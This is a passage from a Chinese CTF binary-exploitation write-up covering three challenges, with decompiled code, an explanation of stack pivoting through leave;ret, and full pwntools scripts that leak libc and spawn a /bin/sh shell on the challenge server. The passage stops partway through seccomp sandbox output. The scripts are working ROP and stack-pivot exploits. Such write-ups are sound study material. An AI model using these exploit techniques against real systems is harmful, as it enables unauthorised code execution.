pop     rbp</span><br><span class="line">.text:000000000040117E                 retn</span><br></pre></td></tr></table></figure><p>这些片段结合使用便可以控制rdi<br>缓冲区填满后直接常规泄露libc即可<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20605</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_add=<span class="number">0x40127b</span></span><br><span class="line">mov_rdi_rsi=<span class="number">0x401180</span></span><br><span class="line">add_rsi=<span class="number">0x4010eb</span></span><br><span class="line">and_rsi_0=<span class="number">0x4010e4</span></span><br><span class="line">ret=<span class="number">0x401150</span></span><br><span class="line">pop_rbp=<span class="number">0x40117d</span></span><br><span class="line">fake_rbp=<span class="number">0x400600</span>-<span class="number">0x20</span></span><br><span class="line">puts_str = <span class="number">0x40128D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">528</span>+<span class="number">12</span>)</span><br><span class="line">payload += p8(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(puts_str)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">214</span>):</span><br><span class="line"> r.sendline(payload)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">540</span>+p8(<span class="number">0x28</span>)+p64(and_rsi_0)+p64(pop_rbp)+p64(fake_rbp)+p64(add_rsi)+p64(mov_rdi_rsi)+p64(puts_plt)+p64(ret)+p64(and_rsi_0)+p64(pop_rbp)+p64(fake_rbp)+p64(add_rsi)+p64(mov_rdi_rsi)+p64(puts_plt)+p64(main_add)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">215</span>):</span><br><span class="line"> r.recvuntil(<span class="string">b&quot;Ret2libc&#x27;s Revenge\n&quot;</span>)</span><br><span class="line">puts_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=puts_add-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdi=libcbase+<span class="number">0x2a3e5</span></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">540</span>+p8(<span class="number">0x28</span>)+p64(pop_rdi)+p64(bin_add)+p64(ret)+p64(sys_add)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="明日方舟寻访模拟器"><a href="#明日方舟寻访模拟器" class="headerlink" title="明日方舟寻访模拟器"></a>明日方舟寻访模拟器</h2><h3 id="复盘-栈迁移-ROP"><a href="#复盘-栈迁移-ROP" class="headerlink" title="复盘&#x2F;栈迁移&#x2F;ROP"></a>复盘&#x2F;栈迁移&#x2F;ROP</h3><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+3Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402C68);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402CA0);</span><br><span class="line">          __isoc99_scanf(&amp;unk_402CE3, &amp;v6);</span><br><span class="line">          getchar();</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          employ(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        employ(<span class="number">10</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(&amp;byte_402CE6);</span><br><span class="line">      __isoc99_scanf(&amp;unk_402CE3, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= <span class="number">0x2710</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          employ(v4);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402D0C);</span><br><span class="line">          getchar();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(&amp;byte_402CFF);</span><br><span class="line">        getchar();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402D23);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    &amp;byte_402D38,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)ch_n,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)dword_405BE4,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)dword_405BE8,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)dword_405BEC);</span><br><span class="line">  __isoc99_scanf(&amp;unk_402CE3, &amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402DC6);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x60u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402DDF);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, byte_402DEF);</span><br><span class="line">  v8 = <span class="number">50015</span>;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402E02);</span><br><span class="line">  system(<span class="string">&quot;echo bye~&quot;</span>);</span><br><span class="line">  v7 = <span class="string">&quot;null&quot;</span>;</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码的漏洞点在于最后的“向好友炫耀”（潜意思是晒欧不得好死吗）时输入名字时存在溢出，题目也有system函数<br>所以最后关键在于传入&#x2F;bin&#x2F;sh<br>我们看调用read函数时的汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, 60h ; &#x27;`&#x27;  ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br></pre></td></tr></table></figure><p>发现读入数据的存放地址是rbp+s，这里s是-0x40，于是我们便可以在第一次read时候先填充垃圾数据直到rbp，然后覆盖rbp为target+0x40，这里target就是我们伪造的栈段的地址(函数结束时都会执行一次leave;ret，这时rbp的值也就变为了我们填充的target+0x40，后文有解释)<br>接着填充返回地址为调用read的地址以便第二次溢出<br>在第二次溢出时我们在target写入’&#x2F;bin&#x2F;sh\x00’，然后控制rdi指向这个target地址，也就指向了&#x2F;bin&#x2F;sh，然后接着写sys地址<br>接着继续填充到ebp，覆盖ebp为target，在返回地址填上leave_ret指令的地址，也就完成了<strong>栈迁移</strong><br><strong>leave_ret指令其实就是</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br><span class="line">pop rip</span><br></pre></td></tr></table></figure><p>其实最初我有疑惑在于我们修改了read的读入地址，第二次读入的数据便不在栈上了，后续填充ebp和返回地址以栈迁移是如何完成的呢？<br>后来我想到，<strong>在调用一个函数前，程序会先同步rsp和rbp，开辟新的栈帧，也就是执行函数序言</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br></pre></td></tr></table></figure><p>在第一次调用结束后，return前会先leave ret一次，这时候rsp指向了rbp，也就是我们覆盖的target+0x40，接着pop rbp，rbp到了target+0x40处，再pop rip，执行我们填充的call_read，调用read函数时，先push rbp，也就是target+0x40入栈，再mov rbp，rsp，这时候rsp指向target+0x40，那么rbp也指向target+0x40，这时候我们发现rsp和rbp都指向target+0x40，接着rsp根据read函数的需求向低地址扩张，然后读入我们输入的数据。这时候我们发现我们已经在target附近伪造了一个栈<br>这时候我们再覆盖rbp为target，覆盖返回地址为leave_ret指令，函数返回时便会leave_ret两次，然后pop进rip的便是target+8处的指令了。也就实现了栈迁移劫持程序执行流<br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20551</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./arknights&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x4018e5</span></span><br><span class="line">leave_ret=<span class="number">0x401393</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">bss_add=<span class="number">0x405b00</span></span><br><span class="line">call_read=<span class="number">0x4018a8</span></span><br><span class="line">sys_plt=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">r.recvuntil(<span class="string">&quot;欢迎使用明日方舟寻访模拟器！祝你好运~\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;请选择：[1]单抽 [2]十连 [3]自定义数量 [4]结束抽卡\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;请选择：[1]向好友炫耀 [2]退出\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;请输入你的名字：&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss_add+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">fake_stack=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(pop_rdi)+p64(bss_add)+p64(ret)+p64(sys_plt)</span><br><span class="line">fake_stack=fake_stack.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2=fake_stack+p64(bss_add)+p64(leave_ret)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><h3 id="复现-ret2libc-orw-ROP"><a href="#复现-ret2libc-orw-ROP" class="headerlink" title="复现&#x2F;ret2libc&#x2F;orw&#x2F;ROP"></a>复现&#x2F;ret2libc&#x2F;orw&#x2F;ROP</h3><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_1309(a1, a2, a3);</span><br><span class="line">  sub_1372();</span><br><span class="line">  sub_14F6();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1519();</span><br><span class="line">    <span class="keyword">switch</span> ( sub_157C(v5) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_15C9();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_1678();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sub_1708();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        sub_179B();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;BabyShark will be very sad.....&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no no no....&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1519</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will give you some options:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. GirlFriend!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. BuyFlowers&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Reply&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. SingSongs&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. I don&#x27;t care&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Choice:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有用的选项源码如下<br><br>选项1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_15C9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_4094 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have already tried to talk to her, and she left...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    dword_4094 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Girl is very beautiful!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;what do you want to say to her?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x50u</span>LL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You say: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;but she left.........&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1678</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to buy her flowers?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Y/N&quot;</span>);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">89</span> || v1 == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_4090 &lt;= <span class="number">200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you don&#x27;t have enough money&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You did it!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;echo /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;what a pity!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1708</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4098 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++dword_4098;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should tell her your name first&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, byte_4060, <span class="number">0x100u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(byte_4060);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You also get her name: XM&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can only introduce yourself twice.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到第二个选项，一看可以直接echo &#x2F;flag，还有这种好事？马上通过选项3修改dword_4090的值大于200，然后发现输出了You did it!\n却没有flag<br>接着发现程序开启了沙箱（悲），禁用了系统调用和open函数并且使⽤read函数的时候第⼀次参数只允许为0，所以这⾥我们需要close(0)之后再调⽤openat打开flag⽂件进⾏读取，否则⽆法使⽤read读取，具体如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwnpwn/xyctf_girlfriend</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x0c 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0014</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x09 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0014</span><br><span class="line"> 0005: 0x15 0x08 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0014</span><br><span class="line"> 0006: 0x15 0x07 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) 